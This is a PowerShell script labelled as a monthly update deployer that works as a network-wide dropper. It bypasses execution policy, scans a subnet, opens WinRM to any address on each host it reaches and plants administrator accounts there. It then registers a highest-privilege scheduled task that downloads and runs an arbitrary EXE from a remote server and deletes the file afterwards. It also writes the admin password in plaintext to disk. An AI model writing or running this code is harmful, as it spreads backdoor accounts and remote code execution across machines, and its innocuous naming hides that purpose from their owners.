
Set-ExecutionPolicy Bypass -Scope CurrentUser -Force

param(
    [Parameter(Mandatory=$true)]
    [string]$UpdateServer,
    
    [Parameter(Mandatory=$true)]
    [string]$ExeName,
    
    [string]$AdminUser = "UpdateAdmin",
    
    [string]$Subnet = "192.168.1."
)

# Generate secure password for admin account
$adminPass = [System.Web.Security.Membership]::GeneratePassword(16, 4)
$securePass = ConvertTo-SecureString $adminPass -AsPlainText -Force
$adminCreds = New-Object System.Management.Automation.PSCredential ($AdminUser, $securePass)

# Create admin account on local machine
try {
    if (-not (Get-LocalUser -Name $AdminUser -ErrorAction SilentlyContinue)) {
        New-LocalUser -Name $AdminUser -Password $securePass -FullName "Update Admin" -Description "Automated update account"
        Add-LocalGroupMember -Group "Administrators" -Member $AdminUser
        Write-Host "Created admin account on local machine" -ForegroundColor Green
    }
} catch {
    Write-Host "Local admin account creation failed: $_" -ForegroundColor Red
    exit 1
}

# Network scanner with parallel processing
function Invoke-NetworkScan {
    $activeHosts = [System.Collections.Generic.List[string]]::new()
    $startRange = 1
    $endRange = 254
    
    1..254 | ForEach-Object -Parallel {
        $ip = "$using:Subnet$_"
        try {
            if (Test-Connection -ComputerName $ip -Count 1 -BufferSize 16 -Quiet -ErrorAction Stop) {
                $using:activeHosts.Add($ip)
                Write-Host "Found active host: $ip" -ForegroundColor Green
            }
        } catch {}
    } -ThrottleLimit 64
    
    return $activeHosts
}

# Configure target computer
function Initialize-Target {
    param([string]$computer, [string]$username, [System.Security.SecureString]$securePassword)
    
    try {
        # Create PSSession with current credentials
        $session = New-PSSession -ComputerName $computer -ErrorAction Stop
        
        # Create admin account and configure WinRM
        Invoke-Command -Session $session -ScriptBlock {
            param($uname, $securePass)
            
            # Create/update admin account
            try {
                $user = Get-LocalUser -Name $uname -ErrorAction Stop
                $user | Set-LocalUser -Password $securePass
            } catch {
                New-LocalUser -Name $uname -Password $securePass -FullName "Update Admin" -Description "Automated update account"
                Add-LocalGroupMember -Group "Administrators" -Member $uname
            }
            
            # Enable WinRM
            Enable-PSRemoting -Force -SkipNetworkProfileCheck
            Set-NetFirewallRule -Name "WINRM-HTTP-In-TCP" -RemoteAddress Any -Action Allow
            winrm set winrm/config/client '@{TrustedHosts="*"}'
            
        } -ArgumentList $username, $securePassword
        
        Remove-PSSession $session
        return $true
    }
    catch {
        Write-Host "Initialization failed for $computer : $($_.Exception.Message)" -ForegroundColor Red
        return $false
    }
}

# Deploy scheduled task to download and run EXE monthly
function New-MonthlyUpdateTask {
    param(
        [string]$computer,
        [System.Management.Automation.PSCredential]$creds,
        [string]$serverUrl,
        [string]$exeName
    )
    
    try {
        Invoke-Command -ComputerName $computer -Credential $creds -ScriptBlock {
            param($url, $exe, $uname)
            
            # Create download and execute script
            $downloadScript = @"
`$ErrorActionPreference = 'Stop'
try {
    # Recreate admin account for execution
    `$adminPass = [System.Web.Security.Membership]::GeneratePassword(16, 4)
    `$securePass = ConvertTo-SecureString `$adminPass -AsPlainText -Force
    
    if (-not (Get-LocalUser -Name "$uname" -ErrorAction SilentlyContinue)) {
        New-LocalUser -Name "$uname" -Password `$securePass -FullName "Update Admin" -Description "Automated update account"
        Add-LocalGroupMember -Group "Administrators" -Member "$uname"
    }
    
    # Download EXE file
    `$exePath = "C:\Windows\Temp\$exe"
    (New-Object System.Net.WebClient).DownloadFile("$url/$exe", `$exePath)
    
    # Execute EXE with admin privileges
    Start-Process -FilePath `$exePath -Wait -NoNewWindow
    
    # Cleanup admin account after execution
    Remove-LocalUser -Name "$uname" -ErrorAction SilentlyContinue
    
} catch {
    "ERROR [``$(Get-Date)``]: ``$(`_.Exception.Message)" | Out-File "C:\UpdateErrors.log" -Append
} finally {
    # Delete EXE file
    if (Test-Path `$exePath) { Remove-Item `$exePath -Force }
}
"@
            Set-Content -Path "C:\Windows\DownloadUpdates.ps1" -Value $downloadScript -Force
            
            # Create scheduled task
            $action = New-ScheduledTaskAction -Execute 'powershell.exe' `
                -Argument "-ExecutionPolicy Bypass -File C:\Windows\DownloadUpdates.ps1"
            
            # Monthly trigger (first day of every month at 3 AM)
            $trigger = New-ScheduledTaskTrigger -Monthly -DaysOfMonth 1 -At 3am
            
            $principal = New-ScheduledTaskPrincipal -UserId "$env:COMPUTERNAME\$uname" `
                -LogonType Password -RunLevel Highest
                
            $settings = New-ScheduledTaskSettingsSet `
                -AllowStartIfOnBatteries `
                -DontStopIfGoingOnBatteries `
                -StartWhenAvailable `
                -WakeToRun `
                -ExecutionTimeLimit (New-TimeSpan -Hours 2)
            
            $task = New-ScheduledTask -Action $action -Principal $principal `
                -Trigger $trigger -Settings $settings
                
            Register-ScheduledTask -TaskName "MonthlySystemUpdates" -InputObject $task -Force
            
            # Run immediately for initial deployment
            Start-ScheduledTask -TaskName "MonthlySystemUpdates"
            
        } -ArgumentList $serverUrl, $exeName, $creds.UserName -ErrorAction Stop
        
        Write-Host "Monthly EXE update task deployed to $computer" -ForegroundColor Cyan
        return $true
    }
    catch {
        Write-Host "Task deployment failed for $computer : $($_.Exception.Message)" -ForegroundColor Red
        return $false
    }
}

# Main execution flow
Write-Host "`n[Phase 1] Creating admin account..." -ForegroundColor Yellow
Write-Host "Admin Account: $AdminUser" -ForegroundColor Cyan

Write-Host "`n[Phase 2] Scanning network..." -ForegroundColor Yellow
$activeComputers = Invoke-NetworkScan

if (-not $activeComputers -or $activeComputers.Count -eq 0) {
    Write-Host "No active hosts found" -ForegroundColor Red
    exit
}

Write-Host "`n[Phase 3] Configuring target computers..." -ForegroundColor Yellow
$configuredComputers = @()
foreach ($computer in $activeComputers) {
    if (Initialize-Target -computer $computer -username $AdminUser -securePassword $securePass) {
        $configuredComputers += $computer
    }
}

Write-Host "`n[Phase 4] Deploying monthly update tasks..." -ForegroundColor Yellow
foreach ($computer in $configuredComputers) {
    New-MonthlyUpdateTask -computer $computer -creds $adminCreds -serverUrl $UpdateServer -exeName $ExeName
}

# Create verification script
$verifyScript = @"
# Monthly Update Verification
`$computers = @('$($configuredComputers -join "','")')
`$securePass = ConvertTo-SecureString '$adminPass' -AsPlainText -Force
`$creds = New-Object System.Management.Automation.PSCredential ("$AdminUser", `$securePass)

foreach (`$computer in `$computers) {
    try {
        `$task = Invoke-Command -ComputerName `$computer -Credential `$creds -ScriptBlock {
            Get-ScheduledTask -TaskName "MonthlySystemUpdates" -ErrorAction Stop | 
            Select-Object TaskName, State, LastRunTime
        } -ErrorAction Stop
        
        "`$computer : Task exists (State: `$(`$task.State) | LastRun: `$(`$task.LastRunTime))"
    } catch {
        "`$computer : Verification failed - `$(`_.Exception.Message)"
    }
}
"@
Set-Content -Path "VerifyDeployment.ps1" -Value $verifyScript

# Phase 5: Cleanup local admin account
Write-Host "`n[Phase 5] Cleaning up local admin account..." -ForegroundColor Yellow
try {
    Remove-LocalUser -Name $AdminUser -ErrorAction Stop
    Write-Host "Removed local admin account from central machine" -ForegroundColor Green
} catch {
    Write-Host "Failed to remove local admin account: $_" -ForegroundColor Yellow
}

Write-Host "`n[!] Deployment Complete [!]" -BackgroundColor DarkBlue -ForegroundColor White
Write-Host "Admin Account: $AdminUser" -ForegroundColor Cyan
Write-Host "Password: $adminPass" -ForegroundColor Cyan
Write-Host "Target Computers: $($configuredComputers.Count)" -ForegroundColor Cyan
Write-Host "Update EXE: ${UpdateServer}/${ExeName}" -ForegroundColor Cyan
Write-Host "`nCreated verification script: VerifyDeployment.ps1" -ForegroundColor Green
Write-Host "Updates will run at 3 AM on the first day of each month" -ForegroundColor Green